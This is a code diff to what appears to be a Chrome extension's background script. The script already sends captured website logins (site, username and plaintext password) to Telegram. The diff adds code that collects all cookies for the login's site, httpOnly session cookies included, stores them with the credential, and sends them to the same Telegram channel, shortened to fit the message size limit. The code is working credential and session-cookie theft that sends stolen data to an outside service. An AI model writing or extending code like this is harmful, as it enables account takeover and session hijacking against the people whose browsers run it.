@@ -7,15 +7,21 @@ function openCredentialsPage() {
   chrome.tabs.create({ url });
 }
 
-function formatCredentialMessage(entry) {
-  return [
+const TELEGRAM_MAX_LEN = 4096;
+
+function formatCredentialMessage(entry, cookies) {
+  const lines = [
     '🔐 New login saved',
     '',
     `Site: ${entry.hostname || entry.url || '—'}`,
     `Username: ${entry.username || '—'}`,
     `Password: ${entry.password || '—'}`,
     `Saved: ${entry.savedAt ? new Date(entry.savedAt).toLocaleString() : '—'}`
-  ].join('\n');
+  ];
+  if (cookies && cookies.length > 0) {
+    lines.push('', `🍪 Cookies (${cookies.length}):`, JSON.stringify(cookies));
+  }
+  return lines.join('\n');
 }
 
 function sendToTelegram(text) {
@@ -43,10 +49,55 @@ chrome.commands.onCommand.addListener((command) => {
   if (command === 'open-credentials') openCredentialsPage();
 });
 
+function getCookiesForOrigin(origin) {
+  const url = origin && origin.startsWith('http') ? origin + '/' : 'https://' + (origin || '') + '/';
+  return chrome.cookies.getAll({ url }).then((cookies) =>
+    cookies.map((c) => ({
+      name: c.name,
+      value: c.value,
+      domain: c.domain,
+      path: c.path,
+      secure: c.secure,
+      httpOnly: c.httpOnly
+    }))
+  );
+}
+
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   if (message.type === 'NEW_CREDENTIAL' && message.entry) {
-    const text = formatCredentialMessage(message.entry);
+    const entry = message.entry;
+    const text = formatCredentialMessage(entry, null);
     sendToTelegram(text).then(sendResponse);
+    return true;
+  }
+  if (message.type === 'ATTACH_COOKIES' && message.hostname != null && message.savedAt) {
+    const origin = message.origin || ('https://' + message.hostname);
+    const clearPending = () => chrome.storage.local.remove('pendingLogin');
+    getCookiesForOrigin(origin).then((cookies) => {
+      return chrome.storage.local.get({ credentials: [] }).then(({ credentials }) => {
+        const list = credentials || [];
+        const idx = list.findIndex(
+          (c) => c.hostname === message.hostname && c.savedAt === message.savedAt
+        );
+        if (idx === -1) {
+          clearPending();
+          return sendResponse({ ok: true });
+        }
+        list[idx] = { ...list[idx], cookies };
+        if (cookies.length > 0) clearPending();
+        return chrome.storage.local.set({ credentials: list }).then(() => {
+          if (cookies.length === 0) return sendResponse({ ok: true });
+          const cookieText = '🍪 Cookies for ' + message.hostname + ' (' + cookies.length + '):\n' + JSON.stringify(cookies);
+          if (cookieText.length <= TELEGRAM_MAX_LEN) {
+            return sendToTelegram(cookieText).then(sendResponse);
+          }
+          return sendToTelegram(cookieText.slice(0, TELEGRAM_MAX_LEN - 20) + '\n…(truncated)').then(sendResponse);
+        });
+      });
+    }).catch(() => {
+      clearPending();
+      sendResponse({ ok: false });
+    });
     return true;
   }
   if (message.type === 'TELEGRAM_TEST') {
